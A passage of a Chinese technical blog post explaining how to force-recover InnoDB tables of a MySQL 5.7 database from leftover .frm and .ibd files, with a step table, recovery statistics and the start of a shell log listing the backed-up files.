    <content type="html"><![CDATA[<p>摘要：Cash恢复的正确方式是：<strong>备份文件（逻辑或物理）+ binlog</strong>进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效</p><p>在本次案例中，某客户数据库因存储空间不够导致数据库服务宕掉，而客户在数据库宕机后，只拷贝了单个<code>cy</code>库所属的目录进行了文件层面的备份，就将其他文件全部清空，当他想重新启动数据库时发现数据库服务启动。MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的<code>.frm</code>和<code>.ibd</code>文件。</p><a id="more"></a><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>Cash恢复的正确方式是：<strong>备份文件（逻辑或物理）+ binlog</strong>进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效</p><p>在本次案例中，某客户只对单个<code>cy</code>库所属的目录进行了文件层面的备份，MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的<code>.frm</code>和<code>.ibd</code>文件。</p><h2 id="强制还原步骤"><a href="#强制还原步骤" class="headerlink" title="强制还原步骤"></a>强制还原步骤</h2><table><thead><tr><th>步骤</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td><strong>创建同版本的MySQL服务实例一枚</strong></td><td></td></tr><tr><td>2</td><td><strong>获取表的列数</strong></td><td>如果有ddl备份直接导入，可惜都是没有的，哭。。。</td></tr><tr><td>2.1</td><td>创建同名表，结构无所谓</td><td>数据库的世界也需要身份证，先造个人拿上身份证，至于人长得啥样几条胳膊都无所谓，名字最重要</td></tr><tr><td>2.2</td><td>停服务；使用备份的frm文件覆盖当前的frm</td><td>偷梁换柱</td></tr><tr><td>2.3</td><td>配置文件添加强制恢复innodb的参数；启动服务</td><td>蒙蔽她的双眼</td></tr><tr><td>2.4</td><td>查看表结构</td><td>数据库会拿着身份证和面前的人（frm文件）做对比</td></tr><tr><td>2.5</td><td>查看错误日志中关于该表的报错</td><td>数据库发现身份证上的人只有1条胳膊，而被检查的人有10条胳膊，明显对不上啊</td></tr><tr><td>2.6</td><td>成功获取表的真实列数；删除这些表</td><td>通过警告可以知道应该造一个有10条胳膊的人</td></tr><tr><td>3</td><td><strong>获取表的结构</strong></td><td></td></tr><tr><td>3.1</td><td>创建同名表，列数一致，列名无所谓</td><td>这一次造人的时候，造一个有10条胳膊的，每条胳膊的名字无所谓，关键是身份证上面的人名和10条胳膊</td></tr><tr><td>3.2</td><td>停服务；使用备份的frm文件覆盖当前的frm</td><td>偷梁换柱</td></tr><tr><td>3.3</td><td>配置文件添加强制恢复innodb的参数；启动服务</td><td>蒙蔽她的双眼</td></tr><tr><td>3.4</td><td>查看表结构</td><td>数据库会拿着新的身份证和面前的人（frm文件）做对比</td></tr><tr><td>3.5</td><td>成功获取表结构</td><td>数据库发现身份证上信息和被检查的人信息一致，名字，胳膊的数量，对上了就认可啦！（数据库只检查表名和列的个数）</td></tr><tr><td>4</td><td><strong>强制恢复表数据</strong></td><td></td></tr><tr><td>4.1</td><td>丢弃当前表的数据</td><td>把这个人的五脏六腑都挖出来</td></tr><tr><td>4.2</td><td>将备份的ibd放到对应路径</td><td>将之前备份的吃了肉的五脏六腑放进去</td></tr><tr><td>4.3</td><td>导入新的数据，如果数据库加载成功则可以看到数据；否则加载失败。</td><td>跟大脑汇报一下新的五脏六腑已经就位可以开始使用了；如果使用得没问题就成功；如果器官已经损坏那么手术失败。</td></tr></tbody></table><h2 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h2><h3 id="数据量"><a href="#数据量" class="headerlink" title="数据量"></a>数据量</h3><table><thead><tr><th>明细</th><th>大小</th><th>备注</th></tr></thead><tbody><tr><td>物理文件</td><td>174M</td><td></td></tr><tr><td>数据库</td><td>1个</td><td>cy</td></tr><tr><td>表</td><td>57张</td><td></td></tr></tbody></table><h3 id="恢复结果"><a href="#恢复结果" class="headerlink" title="恢复结果"></a>恢复结果</h3><blockquote><p>在客户服务器上面结果如下：</p></blockquote><table><thead><tr><th>明细</th><th>成功</th><th>失败</th><th>恢复率</th></tr></thead><tbody><tr><td>表结构</td><td>58</td><td>0</td><td>100%</td></tr><tr><td>表数据</td><td>56</td><td>2</td><td>96%</td></tr></tbody></table><blockquote><p>在我的服务器上面结果如下：</p></blockquote><table><thead><tr><th>明细</th><th>成功</th><th>失败</th><th>恢复率</th></tr></thead><tbody><tr><td>表结构</td><td>58</td><td>0</td><td>100%</td></tr><tr><td>表数据</td><td>58</td><td>0</td><td>100%</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line">[root@toberoot mysql]# /alidata/mysql/bin/mysqld --initialize-insecure --datadir=/alidata/mysql/data/  --user=mysql</span><br><span class="line">[root@toberoot mysql]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot mysql]# mysql -V</span><br><span class="line">mysql  Ver 14.14 Distrib 5.7.17, for linux-glibc2.5 (x86_64) using  EditLine wrapper</span><br><span class="line"></span><br><span class="line">[root@toberoot mysql]# cd ~/home/cy02/</span><br><span class="line">[root@toberoot cy02]# ll</span><br><span class="line">total 178140</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9022 Aug 14  2017 base_dict.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 14 15:00 base_dict.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8822 Mar  2 11:14 biz_advise.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 14:39 biz_advise.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8850 Mar  2 11:14 biz_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar  2 11:14 biz_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9580 Mar  2 11:14 biz.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9286 Mar  2 11:14 biz_gift.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Apr 24 14:08 biz_gift.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8890 Mar  2 11:14 biz_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8745 Mar  2 11:14 biz_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:40 biz_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:42 biz_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:33 biz.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 biz_msg_template.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_msg_template.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8881 Aug 14  2017 biz_take_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 13 19:26 biz_take_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9411 Nov 24 13:22 biz_take.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 15:22 biz_take.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8862 Aug 14  2017 biz_take_wwlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 15:22 biz_take_wwlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8854 Aug 14  2017 biz_take_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 11:52 biz_take_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8925 Aug 14  2017 biz_vip.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 16 09:31 biz_vip.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8852 Aug 14  2017 biz_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:30 biz_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 biz_wx_focus.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx_focus.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9339 Nov 24 13:25 biz_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8874 Aug 14  2017 biz_wx_walt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_wx_walt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 cfg_area.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   311296 Aug 14  2017 cfg_area.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8721 Aug 14  2017 cfg_id_gen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:41 cfg_id_gen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql       61 Aug 14  2017 db.opt</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9053 Aug 14  2017 gprs_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 18:47 gprs_model.ibd</span><br><span class="line">-r--r--r-- 1 mysql mysql 79691776 May 16 14:04 ibdata1</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Dec 19 15:00 mbr_coin_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2097152 May 15 17:27 mbr_coin_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8766 Dec 19 14:53 mbr_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 19:12 mbr_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9155 May 14 11:55 mbr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 20:58 mbr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 mbr_oauth.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 19:37 mbr_oauth.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9011 Aug 14  2017 mbr_pay.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_pay.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8740 Aug 14  2017 mbr_prizen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_prizen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9147 Dec 19 14:56 mbr_recharge.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   294912 May 15 19:11 mbr_recharge.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Aug 14  2017 mbr_wallet_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 mbr_wallet_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 mbr_wallet.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   262144 May 15 19:12 mbr_wallet.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    10100 Dec 19 15:47 ord.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 31457280 May 15 18:41 ord.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8940 Aug 14  2017 ord_item.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_item.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8917 Aug 14  2017 ord_pay_ali.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_ali.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8924 Dec 19 15:55 ord_pay_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 17:27 ord_pay_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 ord_pay_return.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_return.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8966 Dec 20 16:50 ord_pay_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 ord_pay_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9036 Aug 14  2017 ord_pay_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 32505856 May 15 18:41 ord_pay_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9098 Aug 14  2017 prod_base_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_base_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8790 Aug 14  2017 prod_bug_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_bug_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8887 Aug 14  2017 prod_cmd.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8984 Aug 14  2017 prod_cmd_invoke.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd_invoke.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9058 Aug 14  2017 prod_coin_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 14:24 prod_coin_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8798 Aug 14  2017 prod_coin_rpt_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:24 prod_coin_rpt_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9834 Dec 13 14:12 prod.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8835 Aug 14  2017 prod_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8793 Aug 14  2017 prod_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 09:42 prod_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   425984 May 15 09:42 prod.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8851 Aug 14  2017 prod_instl_imgs.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_instl_imgs.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9388 Dec 13 14:13 prod_instl_pos.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   147456 May 15 16:25 prod_instl_pos.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9384 Dec 13 14:14 prod_instl_pos_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   131072 May 15 16:24 prod_instl_pos_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8892 Aug 14  2017 prod_mod_attr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8873 Aug 14  2017 prod_mod_attr_val.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr_val.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9642 Dec 13 14:11 prod_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 11 11:58 prod_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8815 Aug 14  2017 prod_mod_sku.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_sku.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9050 Aug 14  2017 prod_onl_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   163840 May 15 18:42 prod_onl_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9143 Aug 14  2017 prod_sp_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 prod_sp_arg_vals.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_arg_vals.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9190 Dec 13 14:14 sys_acct.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 11:16 sys_acct.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 sys_acct_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   229376 May 11 11:52 sys_acct_res.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9106 Aug 14  2017 sys_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash">获取待恢复表名</span></span><br><span class="line">[root@toberoot cy02]# ll *.frm |awk 